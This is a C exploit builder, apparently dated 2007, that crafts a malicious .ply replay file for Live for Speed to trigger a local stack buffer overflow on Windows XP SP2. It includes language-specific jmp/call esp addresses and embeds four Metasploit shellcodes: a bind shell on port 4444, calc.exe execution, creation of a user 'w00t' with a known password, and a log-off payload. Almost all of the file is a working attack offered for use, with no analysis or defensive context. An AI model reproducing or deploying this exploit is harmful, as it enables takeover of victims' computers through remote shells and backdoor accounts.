#include <windows.h>
#include <stdio.h>
#include <conio.h>


#define Credits_to "Credit's to n00b for finding this buffer over flow" 
#define Ply_file "test ^l^r.ply"  //You have to define your own file name !!

//If none of the jmp esp work for you find your own and define it!!
#define JMP_ESP_English "\x0A\xAF\xD8\x77"  //user32.dll  xp sp2 english
#define CALL_ESP_French "\x8b\x51\x81\x7c"  //Kernel32.dll xp sp2 french
#define JMP_ESP_German  "\x47\x74\xd2\x77"  //user32.dll   xp sp2 german 
 
  
                                
char file_header1[] =
"\x4c\x46\x53\x50\x4c\x59\x00\x06\x00\x00\x00\x00\x20\x00\x00\x00"
"\x00\x00\x01\x01\x01\x01\x01\x00\x01\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x42\x46\x31\x5f\x4e\x48\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00";



char file_header2[] =
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xff\xff\xff\xff\x53\x61\x75\x62\x65\x72\x5f\x4e\x48\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00";


//shellcode from www.metasploit.com bind port 4444
char bind_shellcode[]= 
"\xfc\xbb\xe6\x02\xd5\x0f\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85"
"\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x1a\x68\x3e\x42\x0a\x94\x3f"
"\xa2\x35\x07\x4b\x31\xed\xec\xc0\x8f\xd1\x67\xaa\x0a\x51\x79\xbc"
"\x9e\xee\x61\xc9\xfe\xd0\x90\x26\x49\x9b\xa7\x33\x4b\x75\xf6\x83"
"\xd5\x25\x7d\xc3\x92\x32\xbf\x0e\x57\x3d\xfd\x64\x9c\x06\x55\x5f"
"\x75\x0d\xb0\x14\xda\xc9\x3b\xc0\x83\x9a\x30\x5d\xc7\xc3\x54\x60"
"\x3c\xf8\x48\xe9\x4b\x92\xb4\xf1\x2a\xa9\x84\xd2\xc9\xa6\xa4\xd4"
"\x9a\xf8\x26\x9e\xed\xe4\x9b\x2b\x4d\x1c\xba\x43\xc0\x52\x4c\x78"
"\x8c\x95\x86\xe6\x7e\x0f\x4f\xd4\xb2\xa7\xf8\x69\x81\x68\x53\x71"
"\x35\xfe\x90\x60\x4a\xc5\x76\x84\x65\x66\xfe\x9f\xec\x19\xed\x68"
"\xf3\x4c\x84\x6a\x0c\xbe\x30\xb2\xfb\xcb\x6c\x13\x03\xe5\x3c\xcf"
"\xa8\x5a\x90\xac\x1d\x1f\x45\xcc\x72\xf9\x01\x23\x2f\x63\x81\xca"
"\x2e\xfe\x4d\x69\xaa\x70\x49\x26\x34\xa6\x3f\xd9\x9b\x13\x3f\x09"
"\x73\x3f\x12\x84\x6d\x68\x92\x0f\x3e\xc3\x93\x60\xa9\x0e\x22\x07"
"\x63\x87\x4a\xd1\x24\x73\xe1\x8b\x3b\xab\x9a\x5c\x23\x32\x5b\xe5"
"\xfc\x3b\xb5\x43\xfc\x13\x5c\x06\x66\xf5\xc9\xb5\x0b\x70\xec\x50"
"\x84\xdb\xc6\x68\xad\x3c\x72\x35\x27\x20\xb2\x75\xc4\x0e\x4b\x37"
"\x06\xb0\xf6\x94\xcb\xc1\x8d\xdc\x40\x72\xda\x75\xe5\x7a\xae\x90"
"\xf6\xf7\x95\x63\xde\xac\x42\xce\x8e\x03\x3c\x84\x31\xf2\xef\x0d"
"\x63\x0b\xdf\xc6\x2e\x2a\xe5\xd8\x62\x33\x30\x8e\x7b\x34\x8a\xb0"
"\x54\x41\xa2\xb2\xd6\x91\x29\xb4\x0f\x4b\x4d\x9a\xd8\x9b\x3b\x1f"
"\x46\x08\xc3\xf6\x87\x7e\x3b\xf7\x77\x7e\x3c\xf7\x77";   

//win32 exe calc.exe
char calc_shellcode[]=
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36" 
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41" 
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
"\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x54\x4e\x33\x4b\x38\x4e\x57" 
"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x41\x4b\x38"
"\x4f\x35\x42\x42\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x33\x4b\x58" 
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"
"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e" 
"\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x48"
"\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x50\x4b\x54" 
"\x4b\x58\x4f\x35\x4e\x31\x41\x50\x4b\x4e\x4b\x38\x4e\x41\x4b\x38"
"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x53" 
"\x42\x4c\x46\x46\x4b\x48\x42\x44\x42\x43\x45\x38\x42\x4c\x4a\x37"
"\x4e\x50\x4b\x48\x42\x44\x4e\x50\x4b\x48\x42\x57\x4e\x51\x4d\x4a" 
"\x4b\x48\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x58\x42\x4b"
"\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x46\x4e\x43\x4f\x55\x41\x43" 
"\x48\x4f\x42\x56\x48\x55\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x57"
"\x42\x55\x4a\x46\x4f\x4e\x50\x4c\x42\x4e\x42\x46\x4a\x36\x4a\x49" 
"\x50\x4f\x4c\x48\x50\x30\x47\x35\x4f\x4f\x47\x4e\x43\x46\x41\x56"
"\x4e\x46\x43\x56\x50\x42\x45\x56\x4a\x37\x45\x36\x42\x30\x5a";     

// win32_adduser PASS=w00t EXITFUNC=seh USER=w00t http://metasploit.com
char adduser_shellcode[]=
"\xfc\xbb\xfb\xe2\x33\x0b\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85"
"\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x07\x0a\x77\x0b\xf7\xcb\xf3"
"\x4e\xcb\x40\x7f\x54\x4b\x56\x6f\xdd\xe4\x40\xe4\xbd\xda\x71\x11"
"\x08\x91\x46\x6e\x8a\x4b\x97\xb0\x14\x3f\x5c\xf0\x53\x38\x9c\x3b"
"\x96\x47\xdc\x57\x5d\x7c\xb4\x83\x9a\xf7\xd1\x47\xfd\xd3\x18\xb3"
"\x64\x90\x17\x08\xe2\xf9\x3b\x8f\x1f\x8e\x58\x04\xde\x7b\xe9\x46"
"\xc5\x7f\x29\x47\xc5\x1b\x26\xe8\xf5\x66\xf8\x91\xf9\xe3\xb9\x6d"
"\x89\x83\x25\xc3\x06\x0b\x5e\xf0\x10\x40\xde\xb6\x23\x56\xdf\x3d"
"\x4b\x6a\x80\x70\x7a\xf2\x68\xfa\x7a\x71\x54\x87\x2a\x1d\xa5\xf2"
"\xcf\x82\x2d\x9b\x2e\xb6\xa0\xcc\x31\x21\xdf\x9f\xa9\x83\x45\x18"
"\x57\xfb\xaa\xbb\xb7\x95\xd1\x4f\x98\x1c\x69\xd5\xaa\xfe\xfa\x25"
"\x7b\x8a\x24\x31\x4b\x42\x51\x9d\x84\xe3\xdd\x99\xfa\xc5\xfb\x01"
"\x95\x6c\x70\x62\x05\x01\x1b\x03\xb9\xba\xa9\xac\x34\x34\x6e\x72"
"\xd3\xd9\x07\x1a\x72\x52\xac\x90\xe5\xe0\x23\x27\x95\x28\xcb\xf7"
"\x69\x5c\x13\xd7\xc8\xd8\x17\x27\xcb\xe0\x97\x27\xcb";

//Log user off shell code http://metasploit.com
char Log_off_shellcode[]=
"\xfc\xbb\x25\x48\xf4\xb3\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85"
"\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xd9\xa0\xb0\xb3\x21\x31\xb2"
"\xf1\x1d\xba\xb8\xfc\x25\xbd\xaf\x74\x9a\xa5\xa4\xd4\x04\xd7\x51"
"\xa3\xcf\xe3\x2e\x35\x21\x3a\xf1\xaf\x11\xb9\x31\xbb\x6e\x03\x7b"
"\x49\x71\x41\x97\xa6\x4a\x11\x4c\x43\xd9\x7c\x07\x14\x05\x7e\xf3"
"\xcd\xce\x8c\x48\x99\x8f\x90\x4f\x76\xa4\xb5\xc4\x89\x51\x4c\x86"
"\xad\xa1\x8c\x06\x6e\xcd\x99\x29\x5e\x88\x5e\xd1\x92\x19\x1e\x2e"
"\x20\x6d\x83\x83\xbd\xe5\xb3\x30\xc8\x7e\x43\x76\xcb\x80\x44\xfc"
"\xa4\xbc\x1b\x33\xc3\xdc\xf5\xba\xd3\x9f\x3a\xc7\x73\xf7\x4a\xb2"
"\x70\x58\xc3\x5b\x86\xec\x1d\x0b\x88\x17\x52\xdb\x03\xa3\xf1\x74"
"\x9b\x25\xda\xa7\x0f\x99\x37\xcc\xef\xe9\x77\x2c\xf0\x09\x78\x2c"
"\xf0";




int main(){

FILE *File;

int i = 0;

    if((File=fopen(Ply_file,"wb")) == NULL){
               printf("fuck We are Unable to build the file %s",Ply_file);
               exit(0);
       
    }
   system("cls");
   printf("\n *************************************************");
   printf("\n *Live for speed .ply local file buffer overflow *");
   printf("\n *************************************************");
   printf("\n *          Special thanks to Str0ke             *");
   printf("\n *************************************************");
   printf("\n * Shout's ~ str0ke ~ c0ntex ~ marsu ~v9@fakehalo*");
   printf("\n *          Date : August 5 2007                 *");
   printf("\n *************************************************");
   printf("\n *      Creating .ply replay File please wait !! *");
   printf("\n *************************************************");
   Sleep(4000);
   system("cls");
    {    
    for(i=0;i<sizeof(file_header1)-1;i++)  
              fputc(file_header1[i],File);  
       
    for (int i=0;i<532;i++)                 
    fputs("A", File);                       
    }
    
    int input;
    printf( "[1]. English  Jmp_esp  win xp sp2 \n" );
    printf( "[2]. French  Call_esp win xp sp2 \n" );
    printf( "[3]. German  Jmp_esp  win xp sp2 \n" );
    printf( "[4]. To exit and cancel\n" );
    printf( "Pick your jmp esp: " );
    scanf( "%d", &input );
    switch ( input ) {
        case 1:            
            fputs(JMP_ESP_English,File);
            break;
        case 2:          
            fputs(CALL_ESP_French,File);
            break;
        case 3:        
            fputs(JMP_ESP_German,File);
            break;
        case 4:        
            exit(0);
            break;                                    
    Sleep(500);
    }
    system("cls");
    printf( "[1].Bind to port shell code port 4444\n");
    printf( "[2].Execute calc.exe shell code\n");
    printf( "[3].Add user shell code PASS=w00t USER=w00t\n");
    printf( "[4].Shut down user's computer\n");
    printf( "[5].To exit and cancel\n" );
    printf( "Pick your shell code: " );
    scanf( "%d", &input );
    switch ( input ) {
        case 1:            
            for(i=0;i<sizeof(bind_shellcode)-1;i++)    
            fputc(bind_shellcode[i],File);  
        break;
        case 2:            
            for(i=0;i<sizeof(calc_shellcode)-1;i++)    
            fputc(calc_shellcode[i],File);  
        break;     
        case 3:            
            for(i=0;i<sizeof(adduser_shellcode)-1;i++)    
            fputc(adduser_shellcode[i],File);  
        break;  
        case 4:
            for(i=0;i<sizeof(Log_off_shellcode)-1;i++)    
            fputc(Log_off_shellcode[i],File);  
           break;
        case 5:
        exit(0);
        break;
    }
    Sleep(500);
    for (int i=0;i<170;i++)               
    fputs("B", File);                          
    for(i=0;i<sizeof(file_header2)-1;i++)  
              fputc(file_header2[i],File); 
    {
    fclose(File); 
    system("cls");
    printf("%s successfully created..\n",Ply_file); 
    printf("%s \n",Credits_to);                                                                            
    Sleep(3000);
    return 0;
    }
}
